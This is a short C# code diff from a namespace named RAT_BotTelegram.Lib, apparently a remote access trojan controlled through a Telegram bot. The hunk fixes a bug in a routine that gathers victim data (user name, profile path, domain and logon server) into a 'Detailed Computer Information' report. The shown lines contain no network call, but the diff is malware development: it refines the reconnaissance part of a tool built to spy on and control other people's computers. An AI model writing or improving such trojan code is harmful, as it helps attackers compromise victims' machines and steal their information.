@@ -15,7 +15,7 @@ namespace RAT_BotTelegram.Lib {
             String Info = "Detailed Computer Information" +
 
                 "\n\n*UserData *" +
-                "\n - User Name: "+ Features.getArchitecture()+
+                "\n - User Name: "+ Features.getUserName() +
                 "\n - User Profile: C:\\User\\" + Features.getUserName() +
                 "\n - User Domain: " + Features.getUserName() +
                 "\n - Logon Server: " + Features.getLogonServer() +
